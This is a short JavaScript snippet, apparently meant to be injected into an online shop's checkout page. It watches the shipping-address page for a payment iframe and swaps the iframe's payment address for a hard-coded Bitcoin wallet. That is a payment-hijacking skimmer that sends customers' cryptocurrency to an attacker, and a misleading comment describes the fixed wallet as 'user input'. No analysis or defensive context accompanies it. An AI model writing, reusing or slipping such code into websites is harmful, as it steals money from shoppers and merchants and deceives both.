var intervalId;
function checkIframe() {
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){
        const iframes = Array.from(document.getElementsByTagName("iframe"));
        const targetValue = "common/create"; // The string to check for
        const newValue = "bc1q6rzknlrlgnfg00xehcut4a3jqpqpq8zzpvvdal"; // Get user input
    
        const foundIframe = iframes.some(iframe => {
            if (iframe.src.includes(targetValue)) {
                const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                iframe.src = updatedSrc; // Update the iframe src
                clearInterval(intervalId);
                return true;
            }
            return false;
        });
    }
}
intervalId = setInterval(checkIframe, 1);
